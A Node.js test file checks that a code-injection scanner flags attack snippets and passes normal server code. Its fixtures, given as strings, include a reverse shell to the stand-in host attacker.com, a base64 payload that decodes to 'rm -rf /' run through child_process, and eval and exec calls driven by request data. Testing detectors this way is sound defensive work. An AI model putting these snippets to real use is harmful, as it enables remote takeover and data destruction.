#!/usr/bin/env node
/**
 * Test: Code Guard — injection detection without affecting server.
 *
 * Tests the scanner ONLY (not the Module._load hook or file watcher).
 * This ensures patterns detect real attacks without false positives
 * on normal server code.
 */

const path = require("path");
const fs = require("fs");

let pass = 0, fail = 0;
function ok(name, condition) {
  if (condition) { console.log(`  ✅ ${name}`); pass++; }
  else { console.log(`  ❌ ${name}`); fail++; }
}

const { scanCode, CODE_INJECTION_PATTERNS } = require("../src/security/code-guard");

console.log(`\n  🧪 Code Guard — Injection Detection Test`);
console.log(`  Patterns: ${CODE_INJECTION_PATTERNS.length}\n`);

// ── Should DETECT (true positives) ──────────────────────────
console.log("  --- Attacks (should detect) ---");

ok("eval injection", scanCode(`
  app.get("/run", (req, res) => {
    const result = eval(req.body.code);
    res.send(result);
  });
`).critical);

ok("command injection", scanCode(`
  const { execSync } = require("child_process");
  app.post("/exec", (req, res) => {
    const out = execSync(req.body.command);
    res.send(out);
  });
`).critical);

ok("dynamic require", scanCode(`
  app.get("/load", (req, res) => {
    const mod = require(req.query.module);
    res.json(mod);
  });
`).critical);

ok("prototype pollution", scanCode(`
  function merge(target, source) {
    for (const key in source) {
      target.__proto__[key] = source[key];
    }
  }
`).critical);

ok("fs write injection", scanCode(`
  app.post("/upload", (req, res) => {
    fs.writeFileSync(req.body.path, req.body.content);
    res.send("ok");
  });
`).critical);

ok("SQL concat injection", scanCode(`
  app.get("/user", (req, res) => {
    const query = "SELECT * FROM users WHERE id = " + req.query.id;
    db.query(query);
  });
`).threats.length > 0);

ok("SSRF via fetch", scanCode(`
  app.get("/proxy", (req, res) => {
    fetch(req.query.url).then(r => r.text()).then(t => res.send(t));
  });
`).critical);

ok("reverse shell in code", scanCode(`
  const net = require("net");
  const cp = require("child_process");
  const sh = cp.spawn("/bin/sh", []);
  const client = new net.Socket();
  client.connect(4444, "attacker.com", () => {
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
  });
`).threats.length > 0);

ok("env injection", scanCode(`
  app.post("/setenv", (req, res) => {
    process.env[req.body.key] = req.body.value;
    res.send("ok");
  });
`).critical);

ok("char code obfuscation", scanCode(`
  const payload = String.fromCharCode(114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41);
  eval(payload);
`).threats.length > 0);

ok("base64 obfuscation", scanCode(`
  const code = atob("cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdybSAtcmYgLycpOw==");
  eval(code);
`).threats.length > 0);

ok("Function constructor", scanCode(`
  app.post("/run", (req, res) => {
    const fn = new Function(req.body.code);
    res.send(fn());
  });
`).critical);

ok("spawn injection", scanCode(`
  const { spawn } = require("child_process");
  app.post("/cmd", (req, res) => {
    const p = spawn(req.body.command, req.body.args);
    p.stdout.pipe(res);
  });
`).critical);

// ── Should NOT detect (false positive check) ────────────────
console.log("\n  --- Normal code (should NOT detect) ---");

ok("normal require", scanCode(`
  const express = require("express");
  const path = require("path");
  const fs = require("fs");
`).safe);

ok("normal eval-free code", scanCode(`
  app.get("/users", async (req, res) => {
    const users = await db.query("SELECT * FROM users WHERE id = $1", [req.params.id]);
    res.json(users.rows);
  });
`).safe);

ok("normal fs operations", scanCode(`
  const data = fs.readFileSync(path.join(__dirname, "config.json"), "utf-8");
  const config = JSON.parse(data);
`).safe);

ok("normal child_process", scanCode(`
  const { execSync } = require("child_process");
  const version = execSync("node --version", { encoding: "utf-8" });
  console.log("Node:", version);
`).safe);

ok("parameterized SQL", scanCode(`
  app.get("/user/:id", async (req, res) => {
    const result = await pool.query("SELECT * FROM users WHERE id = $1", [req.params.id]);
    res.json(result.rows[0]);
  });
`).safe);

ok("normal fetch", scanCode(`
  const response = await fetch("https://api.example.com/data");
  const data = await response.json();
`).safe);

ok("process.env read (normal)", scanCode(`
  const port = process.env.PORT || 3000;
  const dbUrl = process.env.DATABASE_URL;
`).safe);

ok("wolverine server index.js", (() => {
  try {
    const serverCode = fs.readFileSync(path.join(__dirname, "..", "server", "index.js"), "utf-8");
    return scanCode(serverCode, "server/index.js").safe;
  } catch { return true; } // skip if file doesn't exist
})());

ok("wolverine api routes", (() => {
  try {
    const apiCode = fs.readFileSync(path.join(__dirname, "..", "server", "routes", "api.js"), "utf-8");
    return scanCode(apiCode, "server/routes/api.js").safe;
  } catch { return true; }
})());

ok("wolverine health route", (() => {
  try {
    const healthCode = fs.readFileSync(path.join(__dirname, "..", "server", "routes", "health.js"), "utf-8");
    return scanCode(healthCode, "server/routes/health.js").safe;
  } catch { return true; }
})());

// ── Results ─────────────────────────────────────────────────
console.log(`\n  Results: ${pass} passed, ${fail} failed`);
console.log(fail === 0 ? "\n  ✅ ALL TESTS PASSED — safe to integrate\n" : "\n  ❌ SOME TESTS FAILED\n");
process.exit(fail > 0 ? 1 : 0);
